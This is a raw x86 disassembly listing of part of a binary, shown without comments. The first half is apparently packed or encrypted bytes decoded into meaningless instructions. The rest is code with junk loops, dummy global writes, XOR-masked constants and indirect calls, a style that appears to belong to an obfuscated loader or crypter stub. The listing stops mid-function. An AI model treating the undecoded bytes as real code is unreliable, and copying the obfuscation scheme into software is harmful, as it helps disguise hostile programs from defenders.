  4057cf:	mov    ah,0x98
  4057d1:	adc    eax,0x7c9f1b81
  4057d6:	je     0x40579a
  4057d8:	mov    es,eax
  4057da:	xor    ebx,edi
  4057dc:	imul   ebx,DWORD PTR [edi],0xffffffbe
  4057df:	into   
  4057e0:	aas    
  4057e1:	push   ecx
  4057e2:	push   ebx
  4057e3:	cmp    BYTE PTR fs:[ecx+0x50],dl
  4057e7:	adc    al,0x2
  4057e9:	push   0xffffff96
  4057eb:	xlat   BYTE PTR ds:[ebx]
  4057ec:	jmp    0x4c143d34
  4057f1:	mov    eax,0xe3ef096
  4057f6:	jmp    0x60df8573
  4057fb:	or     eax,0x2468b8a6
  405800:	fiadd  DWORD PTR [eax-0x36]
  405803:	xor    BYTE PTR [ecx-0x42],0x16
  405807:	in     eax,0xef
  405809:	adc    eax,0x12557578
  40580e:	push   ss
  40580f:	retf   0x2cc4
  405812:	popa   
  405813:	add    ecx,DWORD PTR [eax-0x65]
  405816:	(bad)
  40581b:	add    dh,bl
  40581d:	mov    ah,0x71
  40581f:	enter  0xcaa8,0x1
  405823:	outs   dx,BYTE PTR ds:[esi]
  405824:	out    dx,eax
  405825:	mov    BYTE PTR [ecx+0x11fdd234],dl
  40582b:	repz dec esp
  40582d:	jnp    0x4058a0
  40582f:	mov    dh,0xc5
  405831:	(bad)  
  405832:	aaa    
  405833:	mov    esp,0xa6bc187e
  405838:	sbb    ecx,DWORD PTR [ecx]
  40583a:	or     BYTE PTR [eax-0x12ffbe54],0x47
  405841:	shl    ecx,1
  405843:	stc    
  405844:	retf   
  405845:	std    
  405846:	fmul   st,st(7)
  405848:	push   ds
  405849:	data16 adc al,0x1c
  40584c:	or     eax,0xca7272a4
  405851:	sbb    ch,BYTE PTR [edx]
  405853:	fs retf 0xbf9d
  405857:	pop    eax
  405858:	nop/reserved BYTE PTR [edi+0x4e02baa]
  40585f:	sbb    esi,DWORD PTR [ecx-0x61]
  405862:	sub    DWORD PTR [ebp+0x4c0cd3d7],0xffffff8d
  405869:	push   edi
  40586a:	inc    ecx
  40586b:	ret    
  40586c:	mov    bl,0xd9
  40586e:	sar    DWORD PTR [ecx+0x2187ddbf],0x14
  405875:	adc    eax,0x8e874f48
  40587a:	add    edx,esi
  40587c:	stos   BYTE PTR es:[edi],al
  40587d:	retf   
  40587e:	pop    eax
  40587f:	iret   
  405880:	cmp    DWORD PTR [edx-0x57783014],ecx
  405886:	test   edx,ecx
  405888:	mov    cl,0x2a
  40588a:	adc    ecx,DWORD PTR [ebx+0x1b6b8919]
  405890:	mov    edi,0xe158e3cb
  405895:	cwde   
  405896:	push   edx
  405897:	scas   eax,DWORD PTR es:[edi]
  405898:	jmp    0x4058a6
  40589a:	sbb    eax,0xb328099a
  40589f:	aam    0xc4
  4058a1:	jno    0x405876
  4058a3:	in     al,0x2b
  4058a5:	repz dec ebp
  4058a7:	fs mov al,0x23
  4058ab:	push   edi
  4058ac:	lea    esi,[edi-0x48]
  4058af:	mov    al,0x28
  4058b1:	lods   al,BYTE PTR ds:[esi]
  4058b2:	ret    
  4058b3:	arpl   WORD PTR [ebp+0x51cde0ce],sp
  4058b9:	hlt    
  4058ba:	dec    esp
  4058bb:	clc    
  4058bc:	in     eax,dx
  4058bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058be:	lock ss cli 
  4058c1:	mov    ?,WORD PTR ds:0x40ec1e6d
  4058c7:	std    
  4058c8:	xor    ah,dl
  4058ca:	cmp    bl,al
  4058cc:	fisub  WORD PTR ss:[ecx-0x2b]
  4058d0:	jnp    0x4058b6
  4058d2:	or     cl,BYTE PTR [ecx]
  4058d4:	mov    WORD PTR [esi],?
  4058d6:	fld    TBYTE PTR [eax+ebp*4+0x516db0be]
  4058dd:	js     0x405945
  4058df:	xor    al,0x79
  4058e1:	mov    al,0x5b
  4058e3:	cmc    
  4058e4:	data16 adc al,0xd8
  4058e7:	pop    esp
  4058e8:	retf   0xa94e
  4058eb:	xchg   ah,ah
  4058ed:	das    
  4058ee:	inc    edx
  4058ef:	pop    edx
  4058f0:	fsubr  st,st(6)
  4058f2:	test   al,0xe0
  4058f4:	and    eax,0x38e4ce7d
  4058f9:	ret    0x3d25
  4058fc:	or     esi,ebx
  4058fe:	jae    0x40595b
  405900:	mov    ds:0x1795a89c,al
  405905:	sub    eax,0xd14f553a
  40590a:	xor    DWORD PTR [ebp-0x6e],edi
  40590d:	mov    bh,0x47
  40590f:	rcl    ebx,cl
  405911:	jle    0x40597d
  405913:	xchg   ebp,eax
  405914:	dec    eax
  405915:	jnp    0x4058cb
  405917:	pop    DWORD PTR [esi+ecx*1]
  40591a:	or     al,0x42
  40591c:	or     BYTE PTR [eax-0x32],dh
  40591f:	jno    0x405988
  405921:	jb     0x4058af
  405923:	mov    eax,0x5a0a0475
  405928:	aam    0xf6
  40592a:	xchg   esi,eax
  40592b:	test   eax,0xb6aa6573
  405930:	pop    ecx
  405931:	jnp    0x40594e
  405933:	sti    
  405934:	in     eax,0x3a
  405936:	mov    ecx,0xb7846d15
  40593b:	cld    
  40593c:	xchg   esi,eax
  40593d:	xchg   edx,eax
  40593e:	jl     0x40595c
  405940:	stos   BYTE PTR es:[edi],al
  405941:	xchg   edx,eax
  405942:	push   ebp
  405943:	popa   
  405944:	js     0x4059a2
  405946:	push   0x65ac9225
  40594b:	push   cs
  40594c:	xchg   BYTE PTR [ebx+eiz*4+0x3c],cl
  405950:	cmp    eax,0x55a4e614
  405955:	xor    eax,0x478f47f0
  40595a:	mov    dh,0x64
  40595c:	bound  esp,QWORD PTR [edx]
  40595e:	sub    eax,0xb71ceaee
  405963:	pusha  
  405964:	inc    BYTE PTR [esi+ebp*1+0x4a8d635f]
  40596b:	enter  0x96b6,0x7f
  40596f:	sub    al,0x49
  405971:	(bad)  
  405972:	sahf   
  405973:	jne    0x40592f
  405975:	mov    ds:0xa03e1ac2,eax
  40597a:	mov    ecx,0x1a817253
  40597f:	stos   BYTE PTR es:[edi],al
  405980:	arpl   dx,cx
  405982:	jp     0x405990
  405984:	adc    eax,0xcf1563ee
  405989:	dec    esp
  40598a:	mov    ecx,DWORD PTR [edx-0x347623f2]
  405990:	sub    edx,edi
  405992:	shl    DWORD PTR es:[edx-0x2d13974],0x69
  40599a:	mov    BYTE PTR [ebp-0x1c],al
  40599d:	mov    esi,0xc388e3db
  4059a2:	add    al,0x31
  4059a4:	aas    
  4059a5:	data16 jecxz 0x405978
  4059a8:	jmp    0x405952
  4059aa:	and    ebx,ebx
  4059ac:	mov    ds:0xbfe39440,eax
  4059b1:	je     0x405a06
  4059b3:	cwde   
  4059b4:	mov    al,0x82
  4059b6:	dec    ecx
  4059b7:	mov    esp,DWORD PTR [ebx]
  4059b9:	aam    0xf7
  4059bb:	arpl   WORD PTR [esp+esi*1],dx
  4059be:	push   eax
  4059bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059c0:	fcomi  st,st(1)
  4059c2:	rcl    BYTE PTR [ebx-0x3d],1
  4059c5:	mov    al,0x74
  4059c7:	sub    ecx,DWORD PTR [ebx-0x3c5e93cd]
  4059cd:	xor    al,0x24
  4059cf:	jb     0x4059e4
  4059d1:	push   edx
  4059d2:	imul   BYTE PTR [eax+0x75]
  4059d5:	pop    esi
  4059d6:	fidiv  WORD PTR [edi+ecx*4]
  4059d9:	dec    ebp
  4059da:	mov    ecx,eax
  4059dc:	ss pop ecx
  4059de:	cmp    al,0x1e
  4059e0:	nop
  4059e1:	add    ecx,DWORD PTR [eax]
  4059e3:	pop    ebx
  4059e4:	sbb    al,0xd1
  4059e6:	dec    ebx
  4059e7:	push   esi
  4059e8:	mov    eax,DWORD PTR [edx+0x6f8e90f3]
  4059ee:	mov    DWORD PTR [ecx-0x1],edx
  4059f1:	jae    0x405975
  4059f3:	sbb    DWORD PTR [ebx+0x740d5d86],0x2d539902
  4059fd:	fisttp WORD PTR [ebx]
  4059ff:	and    dh,BYTE PTR [eax-0x756b886]
  405a05:	sbb    al,0xf5
  405a07:	cmp    ebp,DWORD PTR [ebx+0x53]
  405a0a:	imul   esp,DWORD PTR [edx+edx*8],0x5
  405a0e:	xor    dh,al
  405a10:	mov    cl,0xa2
  405a12:	xor    BYTE PTR [ecx+0xcfb64c4],al
  405a18:	jmp    DWORD PTR [eax-0x25fe2871]
  405a1e:	(bad)  
  405a1f:	push   edi
  405a20:	in     eax,0x30
  405a22:	push   0xa79995bc
  405a27:	in     eax,0xe1
  405a29:	mov    ds:0xaa576f67,eax
  405a2e:	jae    0x405a66
  405a30:	retf   0x8018
  405a33:	leave  
  405a34:	stc    
  405a35:	or     eax,0xa0214ad4
  405a3a:	dec    edi
  405a3b:	sbb    al,0x62
  405a3d:	mov    ah,0x6c
  405a3f:	test   eax,0xeee5627a
  405a44:	mov    al,ds:0xfd172ec1
  405a49:	push   esi
  405a4a:	ins    DWORD PTR es:[edi],dx
  405a4b:	enter  0x5c4c,0x4
  405a4f:	fisttp DWORD PTR [ecx]
  405a51:	test   BYTE PTR [ebp+0x51],dl
  405a54:	mov    edx,0xda815ed9
  405a59:	mov    BYTE PTR [esi],al
  405a5b:	sub    eax,DWORD PTR [ecx+0x46]
  405a5e:	and    edi,DWORD PTR [eax]
  405a60:	dec    ebp
  405a61:	jbe    0x405ac5
  405a63:	ret    
  405a64:	mov    esi,0x47686dea
  405a69:	push   edi
  405a6a:	loop   0x405abe
  405a6c:	mov    edx,0xd59bd48b
  405a71:	lea    edi,[ecx+0x55]
  405a74:	popf   
  405a75:	or     dl,0xc9
  405a78:	fld    DWORD PTR [edx+0x69f62605]
  405a7e:	in     al,dx
  405a7f:	xor    DWORD PTR [ebx+0x7b78ee9c],0xf98d8706
  405a89:	mov    ebp,0xe41bc174
  405a8e:	push   ds
  405a8f:	cmp    DWORD PTR [ecx],esi
  405a91:	add    edi,edi
  405a93:	imul   esp,DWORD PTR [ebx+0x1],0x68
  405a97:	push   ss
  405a98:	in     eax,0xf3
  405a9a:	repnz test dh,0xc3
  405a9e:	pop    ebp
  405a9f:	mov    al,0xef
  405aa1:	ds pop es
  405aa3:	cmp    bl,0x6c
  405aa6:	scas   al,BYTE PTR es:[edi]
  405aa7:	sub    al,0x98
  405aa9:	pop    edx
  405aaa:	dec    esi
  405aab:	popf   
  405aac:	cmp    al,0xbf
  405aae:	sub    dh,BYTE PTR [ecx+eiz*2-0x53219dc3]
  405ab5:	add    cl,BYTE PTR [edx+eax*2-0x3]
  405ab9:	dec    edx
  405aba:	add    dh,BYTE PTR [edx+0x6e2fb06f]
  405ac0:	xchg   edx,eax
  405ac1:	pop    edi
  405ac2:	les    esi,FWORD PTR [eax-0x60da3854]
  405ac8:	int    0x3c
  405aca:	outs   dx,BYTE PTR ds:[esi]
  405acb:	push   esp
  405acc:	mov    bh,0x88
  405ace:	mov    dh,0xe6
  405ad0:	xchg   ebx,eax
  405ad1:	mov    esp,0x5e4810ac
  405ad6:	repnz in eax,0x62
  405ad9:	push   esp
  405ada:	(bad)  
  405adb:	call   0x6463e2ae
  405ae0:	inc    esp
  405ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ae2:	pop    es
  405ae3:	xchg   esp,eax
  405ae4:	out    0xfb,eax
  405ae6:	adc    eax,0x68056b3c
  405aeb:	les    esi,FWORD PTR [ebp+0xf]
  405aee:	mov    al,ds:0x460bbb83
  405af3:	push   0x3f
  405af5:	jl     0x405a78
  405af7:	das    
  405af8:	aam    0x94
  405afa:	lods   al,BYTE PTR ds:[esi]
  405afb:	jp     0x405b02
  405afd:	or     edx,esp
  405aff:	adc    esi,DWORD PTR [edi+edi*2]
  405b02:	or     eax,0x3f78c02a
  405b07:	fdiv   QWORD PTR [edi-0x49]
  405b0a:	pop    ds
  405b0b:	fs aad 0xfe
  405b0e:	jg     0x405b1c
  405b10:	popa   
  405b11:	adc    eax,0x2f8f8c64
  405b16:	mov    ah,0x4f
  405b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b19:	sub    BYTE PTR [esi-0x4b],dl
  405b1c:	push   esi
  405b1d:	pop    esi
  405b1e:	sub    al,0x13
  405b20:	stc    
  405b21:	mov    ah,ch
  405b23:	bnd js 0x405ac6
  405b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b27:	loope  0x405b19
  405b29:	or     BYTE PTR [edx+0x48],ch
  405b2c:	jbe    0x405b8f
  405b2e:	adc    DWORD PTR [esi+0x1],ebp
  405b31:	retf   
  405b32:	js     0x405b28
  405b34:	inc    eax
  405b35:	pop    ecx
  405b36:	addr16 xchg ebx,eax
  405b38:	mov    ah,0x1
  405b3a:	lds    esp,FWORD PTR [esi]
  405b3c:	or     eax,0x872ac4c0
  405b41:	int    0x6e
  405b43:	cmp    al,0x87
  405b45:	jl     0x405b32
  405b47:	pop    edi
  405b48:	dec    ecx
  405b49:	jl     0x405acd
  405b4b:	fidiv  DWORD PTR [edx+0x6e69c7a8]
  405b51:	dec    edx
  405b52:	mov    eax,0xc08f749e
  405b57:	aaa    
  405b58:	(bad)  
  405b59:	sbb    dh,dl
  405b5b:	adc    bl,BYTE PTR [esi]
  405b5d:	mov    ebx,0xed7eade7
  405b62:	jns    0x405b69
  405b64:	pop    edi
  405b65:	icebp  
  405b66:	pop    esi
  405b67:	fcom   st(3)
  405b69:	sbb    eax,esp
  405b6b:	cmp    eax,0x3c44a2ba
  405b70:	push   es
  405b71:	sahf   
  405b72:	das    
  405b73:	(bad)  
  405b74:	jge    0x405b6c
  405b76:	scas   al,BYTE PTR es:[edi]
  405b77:	dec    ebx
  405b78:	dec    edx
  405b79:	adc    BYTE PTR [eax],dh
  405b7b:	sub    BYTE PTR ds:0x9be9353,bh
  405b81:	arpl   WORD PTR [esi],cx
  405b83:	les    ebp,FWORD PTR [ebx]
  405b85:	ja     0x405bf2
  405b87:	(bad)  [ebp-0x7d]
  405b8a:	cmp    eax,0x6ac078b9
  405b8f:	mov    ah,0xc3
  405b91:	xchg   esp,eax
  405b92:	xor    BYTE PTR [esi-0x1d8c6844],0x8
  405b99:	aaa    
  405b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b9b:	loop   0x405ba6
  405b9d:	test   eax,0xe13f3a28
  405ba2:	cmp    eax,0xc49ea5df
  405ba7:	(bad)  
  405ba8:	sbb    al,0xfc
  405baa:	add    eax,0x7b9e8c95
  405baf:	retf   
  405bb0:	jnp    0x405c22
  405bb2:	inc    esi
  405bb3:	pop    edx
  405bb4:	andnps xmm5,XMMWORD PTR [ecx-0x80]
  405bb8:	adc    eax,0xe9f8bf6d
  405bbd:	rcr    BYTE PTR [ebx+0x7c],cl
  405bc0:	xchg   edx,eax
  405bc1:	ret    0x2b60
  405bc4:	into   
  405bc5:	push   ecx
  405bc6:	and    edi,DWORD PTR [eax+0x41190fcc]
  405bcc:	imul   edi,DWORD PTR [ebp-0x5],0xffffffca
  405bd0:	ss je  0x405c51
  405bd3:	icebp  
  405bd4:	mov    eax,0x5a3130bd
  405bd9:	jmp    0x405bcf
  405bdb:	imul   esi,DWORD PTR [edi+esi*2-0x29a4f0f3],0xfffffffb
  405be3:	fistp  QWORD PTR ds:0x4d77bae6
  405be9:	shl    BYTE PTR [ebx-0x6],1
  405bec:	inc    ecx
  405bed:	adc    al,0xe0
  405bef:	xor    BYTE PTR [esi],dh
  405bf1:	shl    DWORD PTR [edx-0x4b],1
  405bf4:	jmp    FWORD PTR [eax+0x74]
  405bf7:	mov    ch,0x30
  405bf9:	dec    esi
  405bfa:	mov    ebp,0x8fd405b5
  405bff:	cmc    
  405c00:	sbb    DWORD PTR [edx],eax
  405c02:	out    dx,al
  405c03:	dec    edx
  405c04:	pop    ebp
  405c05:	jnp    0x405bce
  405c07:	(bad)  [ebx]
  405c09:	jbe    0x405c1c
  405c0b:	popa   
  405c0c:	or     eax,0xc7133523
  405c11:	or     ebx,DWORD PTR [ecx-0x29591286]
  405c17:	dec    edx
  405c18:	mov    eax,ds:0x16593376
  405c1d:	push   cs
  405c1e:	nop
  405c1f:	or     ah,BYTE PTR [eax]
  405c21:	or     ah,BYTE PTR [ecx-0xb]
  405c24:	mov    edx,0x8ea2a253
  405c29:	xchg   BYTE PTR [eax-0x771a82e6],ah
  405c2f:	(bad)  
  405c30:	fcmovnbe st,st(4)
  405c32:	gs das 
  405c34:	shl    DWORD PTR [ecx+0x597ef507],1
  405c3a:	pop    ecx
  405c3b:	mov    bl,0x69
  405c3d:	les    edi,FWORD PTR [esi]
  405c3f:	fldcw  WORD PTR [ebp+0x9]
  405c42:	pop    eax
  405c43:	push   edi
  405c44:	xor    eax,0xb4e79edf
  405c49:	mov    eax,0x421a92a1
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421cee
  405c57:	push   DWORD PTR ds:0x421a9a
  405c5d:	push   DWORD PTR ds:0x421cce
  405c63:	push   DWORD PTR ds:0x421d62
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421c92
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423877
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423836
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423aa2
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x4239c2
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
